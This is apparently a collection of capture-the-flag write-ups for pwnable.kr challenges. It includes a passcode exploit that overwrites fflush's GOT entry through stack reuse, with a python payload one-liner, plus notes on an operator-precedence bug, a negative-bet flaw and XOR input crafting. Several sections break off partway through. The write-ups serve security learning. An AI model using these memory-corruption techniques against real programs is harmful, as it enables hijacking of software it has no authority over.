Simple buffer overflow, I try to do it directedly from the shell without success, so do it with python `pwntools` lib

nc = remote("pwnable.kr",9000)
nc.send(message)
nc.interactive()

## passcode
When gcc the file get warning about pass 'int' and not 'int *'  
This means writing to a value that is in the variable 'passcode1'-> Junk seemingly  
Is there a way to change it before we get there and thus write to the good place?  
In the "welcome" function(Which performed before login function) we write to 'name', by using gdb you see the location of **'name'** variable in the stack:
```
(gdb) disas welcome
Dump of assembler code for function welcome:
   ...
   0x0804862f <+38>:    lea    -0x70(%ebp),%edx
   0x08048632 <+41>:    mov    %edx,0x4(%esp)
   0x08048636 <+45>:    mov    %eax,(%esp)
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   ...
End of assembler dump.
```
-> &name = ebp-0x70  
welcome and login using the same stack...  
lets see the location of **'passcode1'** in the stack using gdb:
```
(gdb) disas login
Dump of assembler code for function login:
   ...
   0x0804857c <+24>:    mov    -0x10(%ebp),%edx
   0x0804857f <+27>:    mov    %edx,0x4(%esp)
   0x08048583 <+31>:    mov    %eax,(%esp)
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   ...
End of assembler dump.
```
-> &passcode1 = ebp-0x10  
-> the distance between them is 0x70-0x10 = 96, we can write 100 -> we can overwrite 4 byte of passcode1 -> Yoo!  
What will we write? We want to put a value of a place in the memory that we then jump from, Fortunately we have a call to the **fflush** function that is not executed directly but through the plt mechanism so we have a jump:
```
(gdb) disas fflush
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:     jmp    *0x804a004
   0x08048436 <+6>:     push   $0x8
   0x0804843b <+11>:    jmp    0x8048410
End of assembler dump.
```
So if we put the value 0x804a004 in passcode before we get input to him, when we will get the the point we put input we can insert the address we want the program to jump to.  
Lets find this address using gdb:
```
(gdb) disas login
Dump of assembler code for function login:
   ...
   0x080485e3 <+127>:   movl   $0x80487af,(%esp)   # "/bin/cat flag"
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   ...
End of assembler dump.
```
So, we will put 96 garbage chars and than 0x0804a004 to **'name'** and then enter 0x080485e3 to passcode1:
```shell
passcode@pwnable:~$ python -c "print 'A'*96 + '\x04\xa0\x04\x08' + str(int('0x080485e3', 16))" | ./passcode

## input
5 steps, each requiring a different form of software input (command line arguments, Pipes, user environment, files and sockets).  
I built the [following program](https://gist.github.com/bom2013/51c6012dfa826b4d0aa73e736115760c) (C, I know it's horrible, but got into trouble with the pwn library in PythonðŸ˜…)
To run the server-side script, follow these steps:
```shell

This is basic ARM Reverse Engineering challenge :)  
we need key = key1()+key2()+key3()  
### key1
key1() return the value of 'pc' register, in ARM its 2 instruction ahead: 
```
(gdb) disass key1
Dump of assembler code for function key1:

   ...
End of assembler dump.
```
-> key1 =  0x00008ce4
### key2
key2() do some gibberish and than return pc at some point
```
(gdb) disass key2
Dump of assembler code for function key2:

   ...
   0x00008d10 <+32>:	mov	r0, r3 		; r0 = r3 = 0x00008d0c
End of assembler dump.
```
-> key2 = 0x00008d0c
### key3
key3() return the **lr** register

## mistake
In running the program he receives input twice for some reason.  
When examining the code you notice a wonderful weakness, carelessness and fall in [Operator Precedence](https://en.cppreference.com/w/c/language/operator_precedence):
```c
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
      printf("can't open password %d\n", fd);
      return 0;
}
```
the operator '<' is performed before the operator '=' so what actually happens is that we open the file (returns 1 since the file exists and should not be a problem in opening it), comparing the result(1) to 0 (certainly not less than 0) -> Returns 0 and we puts the result in fd, so that in practice when you read from fd you read from stdin.
So all it takes is to insert a string in pw_buf and a string in pw_buf2 so that their comparison (after the xor function) is equal.  
We will use an auxiliary function to calculate the xor:
```python
def xor(s):
   return "".join([chr(ord(i)^1) for i in s])
pw_buf = "AAAAAAAAAA"
pw_buf2 = xor(pw_buf)
print("pw_buf:", pw_buf)                     # AAAAAAAAAA
print("pw_buf2:", pw_buf2)                   # @@@@@@@@@@
```

## blackjack
Simple text-based blackjack game, but when he check bet he doesn't check if the bet is negative number:
```c
int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);

 if (bet > cash) //If player tries to bet more money than player has
 {
		printf("\nYou cannot bet more money than you have.");
		printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
} // End Function
```
We want more than million so lets enter big negative number:
```shell
Cash: $500

## lotto
The program create 6 letter lotto code(1-45) and then for some reason comapre *every* letter in input to every letter in the lotto number.
we need the comparesion to be equal six time, we can guess the number(very stupid strategy) or we can try input 6 same digits, if the digits is somewhere in the lotto is will compare to it 6 time(one for every digit in the input), we need letter between 1-45, I choose '+', its take some time and then work:
